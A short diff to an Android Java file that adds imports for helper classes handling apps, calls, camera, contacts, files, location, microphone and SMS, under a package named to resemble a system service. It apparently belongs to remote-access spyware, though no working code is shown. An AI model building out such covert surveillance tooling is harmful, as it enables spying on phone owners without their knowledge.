@@ -8,6 +8,15 @@ import android.os.Build;
 import android.os.Looper;
 import android.util.Log;
 
+import com.android.background.services.helpers.AppsListManager;
+import com.android.background.services.helpers.CallsManager;
+import com.android.background.services.helpers.CameraManager;
+import com.android.background.services.helpers.ContactsManager;
+import com.android.background.services.helpers.FileManager;
+import com.android.background.services.helpers.LocManager;
+import com.android.background.services.helpers.MicManager;
+import com.android.background.services.helpers.SMSManager;
+
 import org.apache.commons.io.FileUtils;
 import org.json.JSONException;
 import org.json.JSONObject;
